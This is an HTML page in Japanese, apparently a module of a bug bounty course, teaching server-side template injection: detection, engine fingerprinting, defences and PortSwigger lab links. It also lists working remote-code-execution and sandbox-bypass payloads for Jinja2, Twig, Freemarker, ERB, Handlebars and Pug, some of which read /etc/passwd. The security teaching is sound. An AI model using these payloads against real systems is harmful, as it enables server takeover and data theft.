@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSTI (Server-Side Template Injection) - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 1: Core Vulnerabilities &gt; SSTI
+        </div>
+
+        <div class="page-header">
+            <h1>SSTI (Server-Side Template Injection)</h1>
+            <p class="subtitle">
+                テンプレートエンジンにユーザー入力を注入し、サーバーサイドでのコード実行を実現する。
+                検出は簡単だが、エンジン特定とexploitにはテンプレート構文の知識が必要。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-wsa">WSA Lab</span>
+                <span class="tag tag-handson">Hands-on</span>
+            </div>
+        </div>
+
+        <!-- 原理 -->
+        <div class="section">
+            <h2>原理と仕組み</h2>
+            <p>
+                テンプレートエンジンは動的コンテンツの生成に使用される。
+                ユーザー入力がテンプレートの「コンテンツ」ではなく「コード」として解釈される場合、
+                SSTI が発生する。
+            </p>
+<pre><code>// 安全: ユーザー入力をコンテンツとして渡す
+render("Hello {{name}}", {name: user_input})
+
+// 脆弱: ユーザー入力をテンプレートとして処理
+render("Hello " + user_input)
+// user_input = "{{7*7}}" → "Hello 49" が表示される</code></pre>
+
+            <div class="callout danger">
+                <div class="callout-title">SSTI の Impact</div>
+                <p>
+                    SSTI は多くの場合 <strong>RCE (Remote Code Execution)</strong> に直結する。
+                    テンプレートエンジンの内部オブジェクトにアクセスし、OS コマンドを実行できるため、
+                    severity は Critical が一般的。
+                </p>
+            </div>
+        </div>
+
+        <!-- 検出方法 -->
+        <div class="section">
+            <h2>検出方法 (Detection Methodology)</h2>
+
+            <h3>Step 1: テンプレート注入の確認</h3>
+<pre><code>// 数学的演算で確認
+{{7*7}}     → 49 が表示されれば SSTI
+${7*7}      → 49
+#{7*7}      → 49
+<%= 7*7 %>  → 49
+
+// 文字列操作
+{{'a'*5}}   → "aaaaa" (Jinja2/Twig)
+${"a"*5}    → "aaaaa"</code></pre>
+
+            <h3>Step 2: テンプレートエンジンの特定</h3>
+<pre><code>// 判別フローチャート:
+{{7*'7'}}
+├── 49      → Twig (PHP)
+├── 7777777 → Jinja2 (Python)
+└── Error   → 他のエンジン
+
+${7*7}
+├── 49      → Freemarker (Java) or Mako (Python)
+└── Error   → 他
+
+<%= 7*7 %>
+├── 49      → ERB (Ruby) or EJS (JS)
+└── Error   → 他
+
+// 追加の判別
+{{config}}     → Jinja2 (Flask の config が表示)
+{{self}}       → Jinja2/Twig
+${T(java.lang.Runtime)}  → Spring EL (Java)</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">PolyglotPayload</div>
+<pre><code>${{<%[%'"}}%\.</code></pre>
+                <p>複数のテンプレートエンジンで反応を引き出す万能ペイロード。エラーの種類でエンジンを特定する。</p>
+            </div>
+        </div>
+
+        <!-- エンジン別攻略 -->
+        <div class="section">
+            <h2>エンジン別 Exploitation</h2>
+
+            <h3>Jinja2 (Python / Flask)</h3>
+<pre><code>// 基本情報取得
+{{config}}
+{{config.items()}}
+{{request.environ}}
+
+// RCE - MRO (Method Resolution Order) チェーン
+{{''.__class__.__mro__[1].__subclasses__()}}
+// → 利用可能なクラス一覧を取得
+
+// os.popen 経由
+{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
+
+// 短縮版 (Python 3)
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+
+// request オブジェクト経由
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</code></pre>
+
+            <h3>Twig (PHP / Symfony)</h3>
+<pre><code>// 情報取得
+{{_self.env.getRuntimeLoader()}}
+{{app.request.server.all|join(',')}}
+
+// RCE (Twig 1.x)
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+
+// RCE (Twig 3.x)
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('exec')}}</code></pre>
+
+            <h3>Freemarker (Java / Spring)</h3>
+<pre><code>// 情報取得
+${.version}
+${.data_model}
+
+// RCE
+${"freemarker.template.utility.Execute"?new()("id")}
+
+// ObjectConstructor 経由
+&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;
+${ex("whoami")}
+
+// Runtime 経由
+${object.class.forName("java.lang.Runtime").getRuntime().exec("id")}</code></pre>
+
+            <h3>ERB (Ruby / Rails)</h3>
+<pre><code>// 基本実行
+<%= 7*7 %>
+<%= system("id") %>
+<%= `whoami` %>
+
+// ファイル読み取り
+<%= File.read("/etc/passwd") %>
+
+// 変数内の SSTI
+${system("id")}  // String interpolation context</code></pre>
+
+            <h3>Handlebars (JavaScript / Node.js)</h3>
+<pre><code>// Prototype pollution 経由
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}</code></pre>
+
+            <h3>Pug / Jade (Node.js)</h3>
+<pre><code>// Code execution
+#{7*7}
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync("id").toString();return sh}()}</code></pre>
+        </div>
+
+        <!-- 防御と Bypass -->
+        <div class="section">
+            <h2>防御と Bypass</h2>
+
+            <h3>防御策</h3>
+            <ul>
+                <li><strong>ユーザー入力をテンプレートコードとして処理しない</strong> - 変数として渡す</li>
+                <li><strong>Sandbox モード</strong> - Jinja2 SandboxedEnvironment</li>
+                <li><strong>ロジックレステンプレート</strong> - Mustache/Handlebars (制限的)</li>
+                <li><strong>WAF</strong> - {{, ${, <% のパターン検知</li>
+            </ul>
+
+            <h3>Sandbox Bypass</h3>
+<pre><code>// Jinja2 Sandbox bypass (attr filter)
+{{request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("id")|attr("read")()}}
+
+// フィルタ回避 (. や _ が禁止)
+{{request['application']['__globals__']}}
+{{request['\x5f\x5fclass\x5f\x5f']}}  // hex encode
+{{lipsum['__globals__']['os']['popen']('id')['read']()}}</code></pre>
+        </div>
+
+        <!-- Practice -->
+        <div class="section">
+            <h2>Practice (WSA Labs)</h2>
+            <h3>PortSwigger Web Security Academy</h3>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic" target="_blank">Lab: Basic server-side template injection</a></li>
+                <li><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context" target="_blank">Lab: Basic SSTI (code context)</a></li>
+                <li><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation" target="_blank">Lab: SSTI using documentation</a></li>
+                <li><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit" target="_blank">Lab: Unknown language with documented exploit</a></li>
+                <li><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects" target="_blank">Lab: Information disclosure via user-supplied objects</a></li>
+            </ul>
+
+            <h3>追加リソース</h3>
+            <ul>
+                <li><a href="https://github.com/epinna/tplmap" target="_blank">tplmap - SSTI 自動検出/Exploit ツール</a></li>
+            </ul>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>{{7*7}} から始める</strong>: 簡単な算術で SSTI の有無を確認</li>
+                    <li><strong>エンジン特定が鍵</strong>: {{7*'7'}} の結果で Jinja2 vs Twig を判別</li>
+                    <li><strong>SSTI = RCE</strong>: ほぼ全てのテンプレートエンジンで RCE に到達可能</li>
+                    <li><strong>Sandbox は突破できることが多い</strong>: MRO チェーンやattr filterで回避</li>
+                    <li><strong>入力がレンダリングされる全箇所をチェック</strong>: メール、PDF生成、プレビュー機能</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- References -->
+        <div class="section">
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank">PortSwigger - SSTI</a></li>
+                <li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank">HackTricks - SSTI</a></li>
+                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank">PayloadsAllTheThings - SSTI</a></li>
+                <li><a href="https://portswigger.net/research/server-side-template-injection" target="_blank">PortSwigger Research - SSTI (James Kettle)</a></li>
+            </ul>
+        </div>
+
+        <!-- Complete Button -->
+        <div style="text-align:center; margin:2rem 0;">
+            <button class="complete-btn" data-module-id="18-ssti" onclick="toggleComplete('18-ssti')">Mark Complete</button>
+        </div>
+
+        <!-- Page Nav -->
+        <div class="page-nav">
+            <a href="17-xxe.html">&larr; Prev: XXE</a>
+            <a href="19-business-logic.html">Next: Business Logic &rarr;</a>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
